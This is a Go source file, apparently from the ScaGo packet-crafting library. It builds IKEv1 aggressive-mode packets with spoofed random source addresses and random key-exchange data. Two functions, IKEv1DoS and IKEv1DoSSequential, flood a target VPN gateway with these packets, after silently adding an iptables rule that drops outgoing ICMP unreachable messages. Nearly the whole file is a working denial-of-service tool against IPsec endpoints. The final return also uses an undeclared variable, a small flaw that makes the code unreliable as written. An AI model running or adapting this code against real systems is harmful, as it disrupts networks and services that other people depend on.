package higherlevel

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	golayers "github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/ScaGo/packet"
	communication "github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"os/exec"
	"sync"
)

func CraftIKEv1Packet(destIP, destMAC, srcMAC, srcIPnet string) ([]byte, error) {
	// ETHER , IP and UDP Layers
	etherLayer := packet.EthernetLayer()
	etherLayer.SetSrcMAC(srcMAC)
	etherLayer.SetDstMAC(destMAC)
	etherLayer.SetEthernetType(golayers.EthernetTypeIPv4)

	ipLayer := packet.IPv4Layer()
	ipLayer.SetSrcIP(utils.ParseIPGen())
	ipLayer.SetDstIP(destIP)

	udpLayer := packet.UDPLayer()
	udpLayer.SetSrcPort("500")
	udpLayer.SetDstPort("500")

	// PAYLOAD HEADER
	header := packet.IKEPayloadHeaderLayer()

	// ATTRIBUTES
	at_ENCR := packet.IKETransformAttrLayer()
	at_KEYL := packet.IKETransformAttrLayer()
	at_HASH := packet.IKETransformAttrLayer()
	at_GD := packet.IKETransformAttrLayer()
	at_AUTH := packet.IKETransformAttrLayer()
	at_LIFET := packet.IKETransformAttrLayer()
	at_LIFED := packet.IKETransformAttrLayer()

	if err := at_ENCR.SetType("TV", 1); err != nil {
		fmt.Println(err)
	}
	if err := at_KEYL.SetType("TV", 14); err != nil {
		fmt.Println(err)
	}
	if err := at_HASH.SetType("TV", 2); err != nil {
		fmt.Println(err)
	}
	if err := at_GD.SetType("TV", 4); err != nil {
		fmt.Println(err)
	}
	if err := at_AUTH.SetType("TV", 3); err != nil {
		fmt.Println(err)
	}
	if err := at_LIFET.SetType("TV", 11); err != nil {
		fmt.Println(err)
	}
	if err := at_LIFED.SetType("TLV", 12); err != nil {
		fmt.Println(err)
	}

	if err := at_ENCR.SetLength(7); err != nil {
		fmt.Println(err)
	}
	if err := at_KEYL.SetLength(256); err != nil {
		fmt.Println(err)
	}
	if err := at_HASH.SetLength(6); err != nil {
		fmt.Println(err)
	}
	if err := at_GD.SetLength(16); err != nil {
		fmt.Println(err)
	}
	if err := at_AUTH.SetLength(1); err != nil {
		fmt.Println(err)
	}
	if err := at_LIFET.SetLength(1); err != nil {
		fmt.Println(err)
	}
	if err := at_LIFED.SetLength(4); err != nil {
		fmt.Println(err)
	}

	if err := at_LIFED.SetValue(86400); err != nil {
		fmt.Println(err)
	}

	// TRANSFORMS
	trans := packet.IKETransformLayer()
	if err := header.SetNextPayload(0); err != nil {
		fmt.Println(err)
	}
	trans.SetHeader(header)
	trans.SetTransNb(1)
	if err := trans.SetTransformID(1); err != nil {
		fmt.Println(err)
	}
	trans.AddAttr(at_ENCR, at_KEYL, at_HASH, at_GD, at_AUTH, at_LIFET, at_LIFED)

	// PROPOSAL
	prop := packet.IKEProposalLayer()
	if err := header.SetNextPayload(4); err != nil {
		fmt.Println(err)
	}
	prop.SetHeader(header)
	prop.SetProposalNb(1)
	if err := prop.SetProtocolID(1); err != nil {
		fmt.Println(err)
	}
	prop.AddTransform(trans)

	//ID PAYLOAD
	idpayload := packet.IKEIDLayer()
	if err := header.SetNextPayload(0); err != nil {
		fmt.Println(err)
	}
	idpayload.SetHeader(header)
	if err := idpayload.SetIDType(1); err != nil {
		fmt.Println(err)
	}
	if err := idpayload.SetProtocolID(17); err != nil {
		fmt.Println(err)
	}
	idpayload.SetData("200.1.1.1")

	// NONCE PAYLOAD
	noncepayload := packet.IKENonceLayer()
	if err := header.SetNextPayload(5); err != nil {
		fmt.Println(err)
	}
	noncepayload.SetHeader(header)
	nonce, _ := hex.DecodeString("8dfcf8384c5c32f1b294c64eab69f98e9d8cf7e7f352971a91ff6777d47dffed")
	noncepayload.SetNonce(nonce[:])

	//KE PAYLOAD
	keyExchange := make([]byte, 512)
	rand.Read(keyExchange)
	kepayload := packet.IKEKELayer()
	if err := header.SetNextPayload(10); err != nil {
		fmt.Println(err)
	}
	kepayload.SetHeader(header)
	kepayload.SetKE(keyExchange)

	// SA PAYLOAD
	sapayload := packet.IKESALayer()
	if err := header.SetNextPayload(4); err != nil {
		fmt.Println(err)
	}
	sapayload.SetHeader(header)
	if err := sapayload.SetDOI(1); err != nil {
		fmt.Println(err)
	}
	if err := sapayload.SetSituation(1); err != nil {
		fmt.Println(err)
	}
	sapayload.AddProposal(prop)

	// IKEV1 PACKET
	ikelayer := packet.IKELayer()
	var spi uint64
	binary.Read(rand.Reader, binary.BigEndian, &spi)
	ikelayer.SetInitSPI(spi)
	if err := ikelayer.SetNextPayload(1); err != nil {
		fmt.Println(err)
	}
	ikelayer.SetVersion(0x10)
	if err := ikelayer.SetExchType(4); err != nil {
		fmt.Println(err)
	}
	ikelayer.SetFlags(0x00)
	ikelayer.SetID(00000000)

	if err := noncepayload.SetPayload(idpayload); err != nil {
		fmt.Println(err)
	}
	if err := kepayload.SetPayload(noncepayload); err != nil {
		fmt.Println(err)
	}
	if err := sapayload.SetPayload(kepayload); err != nil {
		fmt.Println(err)
	}
	if err := ikelayer.SetPayload(sapayload); err != nil {
		fmt.Println(err)
	}
	ikelayer.CalculateLength()

	fmt.Println(ikelayer)
	pkt, _ := packet.CraftPacket(ipLayer.Layer(), udpLayer.Layer(), ikelayer.Layer())
	return pkt, err
}

func IKEv1DoS(npackets int, destIP, iface string) {
	exec.Command("iptables", "-A", "OUTPUT", "-p", "icmp", "--icmp-type", "destination-unreachable", "-j", "DROP").Run()
	packets := make([][]byte, npackets)
	destMAC, _ := packet.ARPScanHost("eth0", destIP)
	srcMAC := utils.MacByInt(iface)
	srcIP := utils.IPbyInt(iface)
	var wg sync.WaitGroup
	var mutex sync.Mutex
	for i := 0; i < npackets; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			mutex.Lock()
			pkt, err := CraftIKEv1Packet(destIP, destMAC, srcMAC, srcIP)
			mutex.Unlock()
			if err != nil {
				fmt.Println("Error crafting IKEv1 packet: ", err)
				return
			}
			packets[i] = pkt
		}(i)
	}
	wg.Wait()
	communication.SendMultiplePackets(packets, iface, 10)
}

func IKEv1DoSSequential(npackets int, destIP, iface string) {
	exec.Command("iptables", "-A", "OUTPUT", "-p", "icmp", "--icmp-type", "destination-unreachable", "-j", "DROP").Run()
	packets := make([][]byte, npackets)
	destMAC, _ := packet.ARPScanHost("eth0", destIP)
	srcMAC := utils.MacByInt(iface)
	srcIP := utils.IPbyInt(iface)
	for i := 0; i < npackets; i++ {
		pkt, err := CraftIKEv1Packet(destIP, destMAC, srcMAC, srcIP)
		if err != nil {
			fmt.Println("Error crafting IKEv1 packet: ", err)
			return
		}
		packets[i] = pkt
	}
	communication.SendMultiplePackets(packets, iface, 1)
}
